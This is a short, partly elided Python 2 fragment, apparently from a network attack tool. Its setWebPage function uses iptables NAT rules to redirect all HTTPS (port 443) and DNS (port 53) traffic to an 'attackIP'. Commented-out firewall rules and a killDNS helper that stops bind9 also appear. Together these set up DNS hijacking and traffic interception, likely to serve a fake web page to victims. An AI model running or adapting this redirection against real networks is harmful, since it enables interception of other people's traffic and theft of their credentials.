...
def setWebPage(interface, attackIP):
	...
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 '\
		  '--jump DNAT --to-destination %s' %attackIP)
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 '\
		  '--jump DNAT --to-destination %s' %attackIP)
	
	#os.system('iptables -A OUTPUT -p udp -s %s --sport 1024:65535 -d $ip'\
		#'--dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT' %attackIP)
	#os.system('iptables -A INPUT -p udp -s $ip --sport 53 -d %s'\
		#'--dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT' %attackIP)
	#os.system('iptables -A OUTPUT-p tcp -s %s --sport 1024:65535'\
		#'-d $ip --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT' %attackIP)
	#os.system('iptables -A INPUT -p tcp -s $ip --sport 53 -d %s '\
		#'--dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT' %attackIP)
...
def killDNS():
	print "Stopping DNS"
	os.system('sudo service bind9 stop')
